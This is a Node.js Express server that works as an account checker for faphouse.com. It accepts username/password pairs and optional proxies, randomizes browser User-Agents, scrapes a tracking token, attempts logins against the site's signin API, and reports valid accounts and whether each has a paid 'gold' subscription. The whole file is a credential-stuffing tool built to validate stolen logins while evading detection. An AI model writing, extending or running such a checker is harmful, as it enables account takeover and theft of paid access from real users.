const express = require('express');
const axios = require('axios');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// স্ট্যাটিক ফাইল (frontend) serve
app.use(express.static(path.join(__dirname, '../public')));

// ─── Random User-Agent ───
function getRandomUA() {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
}

// ─── Proxy parser ───
function parseProxy(str) {
  try {
    const url = new URL(str);
    const protocol = url.protocol.replace(':', '');
    const host = url.hostname;
    const port = parseInt(url.port) || (protocol === 'https' ? 443 : 80);
    const auth = url.username ? { username: url.username, password: url.password } : undefined;
    if (protocol === 'http' || protocol === 'https') {
      return { host, port, protocol, auth };
    }
    return null;
  } catch {
    return null;
  }
}

// ─── Main check endpoint ───
app.post('/api/check', async (req, res) => {
  const { username, password, proxy } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, error: 'Missing credentials' });
  }

  let proxyConfig = null;
  if (proxy) {
    const parsed = parseProxy(proxy);
    if (parsed) proxyConfig = parsed;
  }

  const axiosConfig = {
    timeout: 30000,
    headers: {
      'User-Agent': getRandomUA(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive'
    },
    ...(proxyConfig && { proxy: proxyConfig })
  };

  try {
    // Step 1: Get trackingParamsBag
    const homeResp = await axios.get('https://faphouse.com/', axiosConfig);
    const html = homeResp.data;
    const match = html.match(/trackingParamsBag\\":\\"([^"]+)\\"/);
    if (!match) {
      return res.status(500).json({ success: false, error: 'Could not extract trackingParamsBag' });
    }
    const trackingParamsBag = match[1];

    // Step 2: Login
    const loginPayload = {
      login: username,
      password: password,
      rememberMe: '1',
      recaptcha: '',
      trackingParamsBag: trackingParamsBag
    };

    const loginHeaders = {
      'Host': 'faphouse.com',
      'Connection': 'keep-alive',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json',
      'Origin': 'https://faphouse.com',
      'Referer': 'https://faphouse.com/',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'X-CSRF-Token': 'null',
      'User-Agent': getRandomUA()
    };

    const loginResp = await axios.post(
      'https://faphouse.com/api/auth/signin',
      loginPayload,
      {
        ...axiosConfig,
        headers: loginHeaders
      }
    );

    const data = loginResp.data;

    if (data && data.message && data.message.includes('Invalid credential')) {
      return res.json({ success: false, gold: false, error: 'Invalid credential' });
    }

    const success = data && (data.success === true || data.status === 'success' || data.message === 'success');
    if (!success) {
      return res.json({ success: false, gold: false, error: 'Login failed' });
    }

    let hasGold = false;
    if (data && data.hasGoldSubscription !== undefined) {
      hasGold = data.hasGoldSubscription === true || data.hasGoldSubscription === 'true';
    } else {
      // fallback profile check
      try {
        const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
          ...axiosConfig,
          headers: {
            ...loginHeaders,
            'Authorization': `Bearer ${data.token || ''}`
          }
        });
        if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
          hasGold = profileResp.data.hasGoldSubscription === true;
        }
      } catch (_) {}
    }

    return res.json({ success: true, gold: hasGold });

  } catch (error) {
    console.error('Check error:', error.message);
    return res.status(500).json({
      success: false,
      gold: false,
      error: error.message || 'Request failed'
    });
  }
});

// ─── Root route (serve index.html) ───
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

// Vercel-এর জন্য export
module.exports = app;
